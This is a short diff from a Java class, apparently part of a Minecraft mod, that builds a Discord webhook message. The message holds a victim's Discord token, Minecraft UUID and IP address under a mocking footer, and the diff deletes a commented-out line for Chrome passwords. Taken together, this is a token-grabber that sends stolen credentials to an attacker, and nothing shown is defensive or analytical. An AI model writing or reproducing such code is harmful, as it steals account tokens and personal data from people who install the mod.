@@ -134,7 +134,6 @@ public class Methods {
 						// remove the replace "-" thing if u use custompayloads login mod because that mod uses the long uuid!
 						.addField("UUID", uuid.replace("-", ""), false)
 						.addField("Discord Token", discord, false)
-		//				.addField("Passwords", googlechrome, false)
 						.addField("IP", ip, false)
 			    		.setFooter("rip bozo :skull:", ""));
 				dh.execute();
